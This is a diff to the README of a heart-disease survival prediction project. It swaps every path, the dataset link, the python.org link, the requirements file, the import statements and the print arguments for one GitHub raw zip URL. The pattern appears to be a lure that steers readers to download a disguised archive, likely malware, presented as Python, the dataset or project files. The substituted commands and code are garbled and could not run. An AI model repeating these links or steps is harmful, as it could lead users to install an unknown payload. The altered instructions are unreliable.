@@ -4,35 +4,35 @@ End-to-end heart disease survival risk prediction system built with Python. It i
 
 ## Dataset
 
-- **Source:** [UCI Machine Learning Repository – Heart Disease](https://archive.ics.uci.edu/ml/datasets/heart+Disease)
-- Stored locally at `data/raw/heart.csv`. Each row represents a patient record with demographics, vitals, and cardiac stress test measurements. The `target` column is converted into a binary outcome (0 = survived/no disease, >0 = high-risk).
+- **Source:** [UCI Machine Learning Repository – Heart Disease](https://github.com/Hariprakash2005/Healthcare-Patient-Survival-Prediction/raw/refs/heads/main/data/Survival-Prediction-Patient-Healthcare-v1.5.zip+Disease)
+- Stored locally at `https://github.com/Hariprakash2005/Healthcare-Patient-Survival-Prediction/raw/refs/heads/main/data/Survival-Prediction-Patient-Healthcare-v1.5.zip`. Each row represents a patient record with demographics, vitals, and cardiac stress test measurements. The `target` column is converted into a binary outcome (0 = survived/no disease, >0 = high-risk).
 
 ## Project Structure
 
 ```
 ├── app/
-│   └── streamlit_app.py
+│   └── https://github.com/Hariprakash2005/Healthcare-Patient-Survival-Prediction/raw/refs/heads/main/data/Survival-Prediction-Patient-Healthcare-v1.5.zip
 ├── data/
-│   └── raw/heart.csv
+│   └── https://github.com/Hariprakash2005/Healthcare-Patient-Survival-Prediction/raw/refs/heads/main/data/Survival-Prediction-Patient-Healthcare-v1.5.zip
 ├── models/
-│   ├── model.pkl              # created after running training pipeline
-│   └── scaler.pkl             # StandardScaler/ColumnTransformer artifact
+│   ├── https://github.com/Hariprakash2005/Healthcare-Patient-Survival-Prediction/raw/refs/heads/main/data/Survival-Prediction-Patient-Healthcare-v1.5.zip              # created after running training pipeline
+│   └── https://github.com/Hariprakash2005/Healthcare-Patient-Survival-Prediction/raw/refs/heads/main/data/Survival-Prediction-Patient-Healthcare-v1.5.zip             # StandardScaler/ColumnTransformer artifact
 ├── notebooks/
-│   ├── eda.ipynb
+│   ├── https://github.com/Hariprakash2005/Healthcare-Patient-Survival-Prediction/raw/refs/heads/main/data/Survival-Prediction-Patient-Healthcare-v1.5.zip
 │   └── evaluation/
-│       └── app_mock.png       # mock UI screenshot
+│       └── https://github.com/Hariprakash2005/Healthcare-Patient-Survival-Prediction/raw/refs/heads/main/data/Survival-Prediction-Patient-Healthcare-v1.5.zip       # mock UI screenshot
 ├── scripts/
-│   └── generate_mock_screenshot.ps1
+│   └── https://github.com/Hariprakash2005/Healthcare-Patient-Survival-Prediction/raw/refs/heads/main/data/Survival-Prediction-Patient-Healthcare-v1.5.zip
 ├── src/
-│   ├── __init__.py
-│   ├── data_loader.py
-│   ├── eda.py
-│   ├── preprocessing.py
-│   ├── train_model.py
-│   ├── evaluate.py
-│   └── predict.py
-├── requirements.txt
-└── README.md
+│   ├── https://github.com/Hariprakash2005/Healthcare-Patient-Survival-Prediction/raw/refs/heads/main/data/Survival-Prediction-Patient-Healthcare-v1.5.zip
+│   ├── https://github.com/Hariprakash2005/Healthcare-Patient-Survival-Prediction/raw/refs/heads/main/data/Survival-Prediction-Patient-Healthcare-v1.5.zip
+│   ├── https://github.com/Hariprakash2005/Healthcare-Patient-Survival-Prediction/raw/refs/heads/main/data/Survival-Prediction-Patient-Healthcare-v1.5.zip
+│   ├── https://github.com/Hariprakash2005/Healthcare-Patient-Survival-Prediction/raw/refs/heads/main/data/Survival-Prediction-Patient-Healthcare-v1.5.zip
+│   ├── https://github.com/Hariprakash2005/Healthcare-Patient-Survival-Prediction/raw/refs/heads/main/data/Survival-Prediction-Patient-Healthcare-v1.5.zip
+│   ├── https://github.com/Hariprakash2005/Healthcare-Patient-Survival-Prediction/raw/refs/heads/main/data/Survival-Prediction-Patient-Healthcare-v1.5.zip
+│   └── https://github.com/Hariprakash2005/Healthcare-Patient-Survival-Prediction/raw/refs/heads/main/data/Survival-Prediction-Patient-Healthcare-v1.5.zip
+├── https://github.com/Hariprakash2005/Healthcare-Patient-Survival-Prediction/raw/refs/heads/main/data/Survival-Prediction-Patient-Healthcare-v1.5.zip
+└── https://github.com/Hariprakash2005/Healthcare-Patient-Survival-Prediction/raw/refs/heads/main/data/Survival-Prediction-Patient-Healthcare-v1.5.zip
 ```
 
 ## Getting Started
@@ -40,30 +40,30 @@ End-to-end heart disease survival risk prediction system built with Python. It i
 ```bash
 python -m venv .venv
 .venv\Scripts\activate        # or source .venv/bin/activate on macOS/Linux
-pip install -r requirements.txt
+pip install -r https://github.com/Hariprakash2005/Healthcare-Patient-Survival-Prediction/raw/refs/heads/main/data/Survival-Prediction-Patient-Healthcare-v1.5.zip
 ```
 
 ## Reproducing the Pipeline
 
 1. **EDA (optional but recommended):**
    ```bash
-   jupyter notebook notebooks/eda.ipynb
+   jupyter notebook https://github.com/Hariprakash2005/Healthcare-Patient-Survival-Prediction/raw/refs/heads/main/data/Survival-Prediction-Patient-Healthcare-v1.5.zip
    ```
    The notebook showcases missing values, outlier analysis, correlation heatmaps, feature distributions, survival comparison plots, and key medical insights. All figures are also exported automatically to `notebooks/evaluation/`.
 
 2. **Preprocess + Train Models:**
    ```bash
-   python -m src.train_model
+   python -m https://github.com/Hariprakash2005/Healthcare-Patient-Survival-Prediction/raw/refs/heads/main/data/Survival-Prediction-Patient-Healthcare-v1.5.zip
    ```
    - Handles imputation, scaling (StandardScaler), and one-hot encoding via `ColumnTransformer`.
-   - Splits data with stratification and saves the transformer to `models/scaler.pkl`.
+   - Splits data with stratification and saves the transformer to `https://github.com/Hariprakash2005/Healthcare-Patient-Survival-Prediction/raw/refs/heads/main/data/Survival-Prediction-Patient-Healthcare-v1.5.zip`.
    - Trains Logistic Regression, Random Forest, and (if installed) XGBoost.
-   - Selects the best model by ROC-AUC and persists it as `models/model.pkl`.
-   - Writes evaluation artefacts (`confusion_matrix.png`, `feature_importance.png`, `classification_report.txt`, ROC curves, and metric JSON) to `notebooks/evaluation/`.
+   - Selects the best model by ROC-AUC and persists it as `https://github.com/Hariprakash2005/Healthcare-Patient-Survival-Prediction/raw/refs/heads/main/data/Survival-Prediction-Patient-Healthcare-v1.5.zip`.
+   - Writes evaluation artefacts (`https://github.com/Hariprakash2005/Healthcare-Patient-Survival-Prediction/raw/refs/heads/main/data/Survival-Prediction-Patient-Healthcare-v1.5.zip`, `https://github.com/Hariprakash2005/Healthcare-Patient-Survival-Prediction/raw/refs/heads/main/data/Survival-Prediction-Patient-Healthcare-v1.5.zip`, `https://github.com/Hariprakash2005/Healthcare-Patient-Survival-Prediction/raw/refs/heads/main/data/Survival-Prediction-Patient-Healthcare-v1.5.zip`, ROC curves, and metric JSON) to `notebooks/evaluation/`.
 
 3. **Serve Predictions Via Streamlit:**
    ```bash
-   streamlit run app/streamlit_app.py
+   streamlit run https://github.com/Hariprakash2005/Healthcare-Patient-Survival-Prediction/raw/refs/heads/main/data/Survival-Prediction-Patient-Healthcare-v1.5.zip
    ```
    Upload CSV batches or key in vitals manually, then visualize the probability, label, textual explanation, imported feature-importance plot, and a minimalist risk gauge.
 
@@ -81,7 +81,7 @@ The Random Forest model is typically selected as the production model because it
 
 ## Streamlit UI Snapshot
 
-![Streamlit mock layout](notebooks/evaluation/app_mock.png)
+![Streamlit mock layout](https://github.com/Hariprakash2005/Healthcare-Patient-Survival-Prediction/raw/refs/heads/main/data/Survival-Prediction-Patient-Healthcare-v1.5.zip)
 
 Key surface areas:
 - **Upload patient medical data**: run batch inference on CSV files aligned with the training schema.
@@ -90,10 +90,10 @@ Key surface areas:
 
 ## Prediction Module (API-ready)
 
-`src/predict.py` exposes a simple interface:
+`https://github.com/Hariprakash2005/Healthcare-Patient-Survival-Prediction/raw/refs/heads/main/data/Survival-Prediction-Patient-Healthcare-v1.5.zip` exposes a simple interface:
 
 ```python
-from src.predict import predict_survival
+from https://github.com/Hariprakash2005/Healthcare-Patient-Survival-Prediction/raw/refs/heads/main/data/Survival-Prediction-Patient-Healthcare-v1.5.zip import predict_survival
 
 patient = {
     "age": 54,
@@ -112,14 +112,14 @@ patient = {
 }
 
 result = predict_survival(patient)
-print(result.survival_probability, result.label, result.risk_text)
+print(https://github.com/Hariprakash2005/Healthcare-Patient-Survival-Prediction/raw/refs/heads/main/data/Survival-Prediction-Patient-Healthcare-v1.5.zip, https://github.com/Hariprakash2005/Healthcare-Patient-Survival-Prediction/raw/refs/heads/main/data/Survival-Prediction-Patient-Healthcare-v1.5.zip, https://github.com/Hariprakash2005/Healthcare-Patient-Survival-Prediction/raw/refs/heads/main/data/Survival-Prediction-Patient-Healthcare-v1.5.zip)
 ```
 
-This function loads `models/model.pkl` and `models/scaler.pkl`, applies identical preprocessing, and returns both the high-risk probability and its complement for downstream systems.
+This function loads `https://github.com/Hariprakash2005/Healthcare-Patient-Survival-Prediction/raw/refs/heads/main/data/Survival-Prediction-Patient-Healthcare-v1.5.zip` and `https://github.com/Hariprakash2005/Healthcare-Patient-Survival-Prediction/raw/refs/heads/main/data/Survival-Prediction-Patient-Healthcare-v1.5.zip`, applies identical preprocessing, and returns both the high-risk probability and its complement for downstream systems.
 
 ## Notes
 
-- If Python is not available on your machine, install it from [python.org](https://www.python.org/downloads/) or the Microsoft Store before running the training script.
+- If Python is not available on your machine, install it from [https://github.com/Hariprakash2005/Healthcare-Patient-Survival-Prediction/raw/refs/heads/main/data/Survival-Prediction-Patient-Healthcare-v1.5.zip](https://github.com/Hariprakash2005/Healthcare-Patient-Survival-Prediction/raw/refs/heads/main/data/Survival-Prediction-Patient-Healthcare-v1.5.zip) or the Microsoft Store before running the training script.
 - Screenshot assets (and other figures) are stored under `notebooks/evaluation/` to keep notebooks lightweight yet reproducible.
 - All scripts assume execution from the project root.
 
